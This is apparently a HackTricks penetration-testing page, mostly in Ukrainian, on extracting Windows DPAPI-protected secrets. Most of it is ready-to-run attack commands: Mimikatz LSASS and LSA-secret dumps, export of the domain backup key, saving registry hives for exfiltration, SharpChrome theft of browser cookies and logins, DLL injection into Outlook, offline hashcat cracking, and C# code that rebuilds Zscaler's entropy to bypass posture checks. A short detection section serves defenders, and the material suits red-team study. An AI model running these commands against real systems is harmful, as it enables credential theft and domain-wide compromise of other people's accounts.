# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

Data Protection API (DPAPI) переважно використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи секрети користувача або системи як важливе джерело ентропії. Такий підхід спрощує шифрування для розробників, оскільки дає змогу шифрувати дані за допомогою ключа, отриманого із секретів входу користувача або, у разі системного шифрування, із секретів доменної автентифікації системи, усуваючи потребу самостійно керувати захистом ключа шифрування.

Найпоширеніший спосіб використання DPAPI — через функції **`CryptProtectData` і `CryptUnprotectData`**, які дають змогу застосункам шифрувати та розшифровувати дані, використовуючи контекст безпеки поточного процесу, що виконав вхід. За замовчуванням дані може розшифрувати лише той самий контекст користувача або системи, який їх зашифрував.<sup>[[2]](#references)[[3]](#references)</sup>

Ці функції також приймають необов'язковий **параметр ентропії**, який використовується під час шифрування та розшифрування. Для розшифрування даних, захищених із використанням необов'язкової ентропії, потрібне те саме значення ентропії.<sup>[[2]](#references)[[6]](#references)</sup>

### Генерація ключів користувачів

DPAPI отримує специфічне для користувача значення (яке часто називають **pre-key**) з облікових даних користувача. Точний спосіб отримання залежить від облікового запису та версії операційної системи; для доменних користувачів інструменти можуть отримати потрібне значення з матеріалу NTLM користувача.<sup>[[2]](#references)</sup>

Це особливо цікаво, оскільки якщо attacker може отримати хеш пароля користувача, він може:

- **Розшифрувати будь-які дані, зашифровані за допомогою DPAPI**, використовуючи ключ цього користувача, без необхідності звертатися до будь-якого API
- Спробувати **зламати пароль** offline, намагаючись згенерувати дійсний ключ DPAPI

DPAPI підтримує один або кілька **master keys** для кожного користувача замість створення нового master key для кожного захищеного blob. Кожен master key має **GUID** (Globally Unique Identifier), а зашифрований blob містить інформацію про те, який master key його захищає.<sup>[[2]](#references)</sup>

Master keys зберігаються в каталозі **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` — Security Identifier користувача. Файл master key містить матеріал, захищений за допомогою **pre-key** користувача, а для доменних користувачів — матеріал відновлення, захищений за допомогою **domain backup key**.<sup>[[2]](#references)</sup>

Зверніть увагу, що **domain key, який використовується для шифрування master key, розташований на контролерах домену і ніколи не змінюється**, тому якщо attacker має доступ до контролера домену, він може отримати domain backup key і розшифрувати master keys усіх користувачів у домені.<sup>[[2]](#references)</sup>

Зашифровані blobs містять **GUID master key**, який використовувався для шифрування даних, у своїх заголовках.

> [!TIP]
> Зашифровані DPAPI blobs починаються з **`01 00 00 00`**

Знайти master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ось як виглядатиме набір Master Keys користувача:

![What is DPAPI - Users key generation: Ось як виглядатиме набір Master Keys користувача](<../../images/image (1121).png>)

### Генерація ключа Machine/System

Цей ключ використовується комп’ютером для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret** — спеціальному ключі, доступ до якого має лише користувач SYSTEM. Цей ключ використовується для шифрування даних, до яких має отримувати доступ сама система, наприклад облікових даних рівня комп’ютера або загальносистемних секретів.<sup>[[2]](#references)</sup>

Зверніть увагу, що ці ключі **не мають domain backup**, тому доступні лише локально:

- **Mimikatz** може отримати до них доступ, виконавши dump LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в registry, тому адміністратор може **змінити дозволи DACL, щоб отримати до нього доступ**. Шлях у registry: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Також можливе offline extraction з registry hives. Наприклад, маючи права адміністратора на цільовій системі, збережіть hives і exfiltrate їх:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Потім на вашій analysis box відновіть секрет DPAPI_SYSTEM LSA з hive-файлів і використайте його для розшифрування blobs машинного рівня (паролів запланованих завдань, облікових даних служб, профілів Wi‑Fi тощо):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Дані, захищені DPAPI

Серед персональних даних, захищених DPAPI:

- Windows creds
- паролі та дані автозаповнення Internet Explorer і Google Chrome
- паролі облікових записів електронної пошти та внутрішніх FTP для таких застосунків, як Outlook і Windows Mail
- паролі для спільних папок, ресурсів, бездротових мереж і Windows Vault, включно з ключами шифрування
- паролі для підключень до віддаленого робочого столу, .NET Passport, а також приватні ключі для різних цілей шифрування та автентифікації
- мережеві паролі, якими керує Credential Manager, і персональні дані в застосунках, що використовують CryptProtectData, таких як Skype, MSN messenger тощо
- зашифровані blobs у реєстрі
- ...

Системні захищені дані включають:
- паролі Wifi
- паролі Scheduled task
- ...

### Варіанти отримання master key

- Якщо користувач має привілеї domain admin, він може отримати доступ до **ключа резервного копіювання домену**, щоб розшифрувати всі master keys користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи локальні права адміністратора, можна **отримати доступ до пам’яті LSASS**, щоб витягти головні ключі DPAPI усіх підключених користувачів і ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, він може отримати доступ до **DPAPI_SYSTEM LSA secret**, щоб розшифрувати головні ключі машини:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо пароль або NTLM-хеш користувача відомий, ви можете **безпосередньо розшифрувати головні ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте в сесії цього користувача, можна попросити DC надати **резервний ключ для розшифрування головних ключів через RPC**. Якщо ви є локальним адміністратором, а користувач увійшов у систему, для цього можна **викрасти його токен сеансу**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Пошук зашифрованих даних DPAPI

Поширені **файли, захищені користувачами**, знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Також перевірте заміну `\Roaming\` на `\Local\` у наведених вище шляхах.

Приклади переліку:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити зашифровані DPAPI blobs у файловій системі, реєстрі та B64 blobs:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того самого репозиторію) можна використовувати для розшифрування за допомогою DPAPI таких чутливих даних, як cookies.<sup>[[12]](#references)</sup>

#### Швидкі рецепти для Chromium/Edge/Electron (SharpChrome)

- Поточний користувач, інтерактивне розшифрування збережених облікових даних/cookies (працює навіть із app-bound cookies у Chrome 127+, оскільки додатковий ключ отримується з Credential Manager користувача під час виконання в контексті користувача):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-аналіз, коли у вас є лише файли. Спочатку витягніть AES state key із профілю "Local State", а потім використайте його для розшифрування cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Загальнодоменне/віддалене triage, коли у вас є резервний ключ домену DPAPI (PVK) і права адміністратора на цільовому хості:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Якщо у вас є DPAPI prekey/credkey користувача (отриманий із LSASS), ви можете пропустити password cracking і безпосередньо розшифрувати дані профілю:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Нотатки
- У новіших збірках Chrome/Edge певні cookies можуть зберігатися з використанням шифрування "App-Bound". Офлайн-розшифрування цих конкретних cookies неможливе без додаткового app-bound ключа; запустіть SharpChrome у контексті цільового користувача, щоб автоматично отримати його. Дивіться публікацію в блозі про безпеку Chrome, на яку наведено посилання нижче.<sup>[[5]](#references)</sup>

### Ключі доступу та дані

- **Використовуйте SharpDPAPI**, щоб отримати облікові дані з DPAPI-зашифрованих файлів поточного сеансу:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримати інформацію про облікові дані** на кшталт зашифрованих даних і guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Отримання доступу до masterkeys**:

Розшифруйте masterkey користувача, який запитує **domain backup key**, за допомогою RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування masterkey (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати пароль у відкритому вигляді, або `/pvk`, щоб указати файл приватного ключа домену DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використовувати `/rpc`, щоб отримати ключ резервної копії домену, `/password`, щоб використати пароль у відкритому вигляді, `/pvk`, щоб указати файл приватного ключа домену DPAPI, `/unprotect`, щоб використати поточний сеанс користувача...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Безпосереднє використання DPAPI prekey/credkey (пароль не потрібен)

Якщо ви можете виконати dump LSASS, Mimikatz часто розкриває DPAPI key для кожного входу в систему, який можна використати для розшифрування masterkeys користувача без знання пароля у відкритому вигляді. Передайте це значення безпосередньо інструменту:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Розшифрувати деякі дані, використовуючи **поточний сеанс користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

Якщо у вас є SID і пароль користувача-жертви (або NT hash), ви можете повністю офлайн розшифрувати DPAPI masterkeys і Credential Manager blobs за допомогою Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Знайдіть артефакти на диску:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Відповідний masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Якщо інструменти для передачі файлів працюють нестабільно, закодуйте файли у base64 на хості та скопіюйте результат:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Розшифрувати masterkey за допомогою SID і пароля/хешу користувача:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Використайте розшифрований masterkey, щоб розшифрувати credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Цей workflow часто відновлює доменні облікові дані, збережені програмами за допомогою Windows Credential Manager, зокрема облікові записи адміністраторів (наприклад, `*_adm`).

---

### Обробка необов'язкової **ентропії** ("стороння ентропія")

Деякі програми передають додаткове значення **ентропії** до `CryptProtectData`. Без цього значення blob неможливо розшифрувати, навіть якщо відомий правильний masterkey. Тому отримання ентропії є необхідним під час атак на облікові дані, захищені таким способом (наприклад, Microsoft Outlook і деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це DLL у user-mode, яка встановлює hooks на функції DPAPI всередині цільового процесу та прозоро записує будь-яку передану необов'язкову ентропію. Запуск EntropyCapture у режимі **DLL-injection** проти таких процесів, як `outlook.exe` або `vpnclient.exe`, створить файл, що зіставляє кожен буфер ентропії з процесом-викликачем і blob. Пізніше захоплену ентропію можна передати до **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`), щоб розшифрувати дані.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline cracking masterkeys (Hashcat & DPAPISnoop)

Microsoft introduced a **context 3** format for masterkey starting with Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) added hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) and **22102** (context 3), enabling GPU-accelerated cracking of user passwords directly from the masterkey file. Attackers can therefore perform word-list or brute-force attacks without interacting with the target system.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automates the process:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може аналізувати Credential і Vault blobs, розшифровувати їх за допомогою зламаних ключів і експортувати паролі у відкритому вигляді.<sup>[[8]](#references)</sup>


### Доступ до даних іншої машини

У **SharpDPAPI і SharpChrome** можна вказати опцію **`/server:HOST`**, щоб отримати доступ до даних віддаленої машини. Звичайно, потрібно мати доступ до цієї машини, і в наведеному нижче прикладі передбачається, що **доменний резервний ключ шифрування відомий**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — це tool, який автоматизує вилучення всіх користувачів і комп’ютерів із LDAP directory, а також вилучення резервного ключа доменного контролера через RPC. Потім скрипт визначає IP-адреси всіх комп’ютерів і виконує smbclient на кожному з них, щоб отримати всі DPAPI blobs усіх користувачів і розшифрувати їх за допомогою резервного ключа домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

За допомогою списку комп’ютерів, отриманого з LDAP, можна знайти кожну підмережу, навіть якщо ви не знали про її існування!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично dump-ити secrets, захищені DPAPI. У релізі 2.x представлено:<sup>[[9]](#references)</sup>

* Паралельний збір blobs із сотень hosts
* Парсинг **context 3** masterkeys та автоматична інтеграція зламування Hashcat
* Підтримка зашифрованих cookies Chrome з режимом "App-Bound" (див. наступний розділ)
* Новий режим **`--snapshot`** для повторного опитування endpoints і порівняння новостворених blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — це C# parser для файлів masterkey/credential/vault, який може виводити формати Hashcat/JtR і, за потреби, автоматично запускати cracking. Він повністю підтримує формати machine та user masterkey аж до Windows 11 24H1.<sup>[[8]](#references)</sup>


## Типові виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших каталогах, пов’язаних із DPAPI.
- Особливо через network share, наприклад **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних tools для доступу до пам’яті LSASS чи dump-у masterkeys.
- Подія **4662**: *An operation was performed on an object* — може бути пов’язана з доступом до об’єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Вразливості та зміни екосистеми у 2023–2025 роках

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023 року). Зловмисник із мережевим доступом міг змусити учасника домену отримати шкідливий резервний ключ DPAPI, що дозволяло розшифровувати user masterkeys. Вразливість виправлено в сукупному оновленні за листопад 2023 року — адміністратори повинні переконатися, що DC і робочі станції повністю оновлені.<sup>[[4]](#references)</sup>
* **Шифрування cookies Chrome 127 “App-Bound”** (липень 2024 року) замінило застарілий захист, що використовував лише DPAPI, додатковим ключем, який зберігається в **Credential Manager** користувача. Для offline-розшифрування cookies тепер потрібні і masterkey DPAPI, і **GCM-wrapped app-bound key**. SharpChrome v2.3 і DonPAPI 2.x можуть отримати додатковий ключ під час роботи в user context.<sup>[[5]](#references)</sup>


### Практичний приклад: Zscaler Client Connector — custom entropy, отримана із SID

Zscaler Client Connector зберігає кілька configuration files у `C:\ProgramData\Zscaler` (наприклад, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифрований за допомогою **DPAPI (Machine scope)**, але vendor надає **custom entropy**, яка *обчислюється під час виконання* замість зберігання на диску.<sup>[[1]](#references)</sup>

Entropy відновлюється з двох елементів:

1. Секрет, жорстко вбудований у `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить configuration.

Алгоритм, реалізований DLL, еквівалентний такому:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудовано в DLL, яку можна прочитати з диска, **будь-який локальний зловмисник із правами SYSTEM може повторно згенерувати entropy для будь-якого SID** і розшифрувати blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування дає повну конфігурацію JSON, включно з кожною **device posture check** та її очікуваним значенням — ця інформація є дуже цінною під час спроб виконати client-side bypass.

> TIP: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені за допомогою DPAPI **без** entropy (`16` нульових байтів). Тому після отримання привілеїв SYSTEM їх можна безпосередньо розшифрувати за допомогою `ProtectedData.Unprotect`.

## References

- [1] [Synacktiv – Чи варто довіряти вашому zero trust? Обхід posture checks Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Секрети DPAPI. Аналіз безпеки та відновлення даних у DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Читання зашифрованих DPAPI секретів за допомогою Mimikatz і C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 — вразливість Windows DPAPI (Data Protection Application Programming Interface) Spoofing](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Підвищення безпеки cookie Chrome у Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: просте вилучення Optional Entropy DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Примітки до випуску hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop — репозиторій GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 — сторінка проєкту PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket — dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: зловживання AD ACL, злам Argon2 KeePassXC та розшифрування DPAPI до отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome — використання та параметри](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
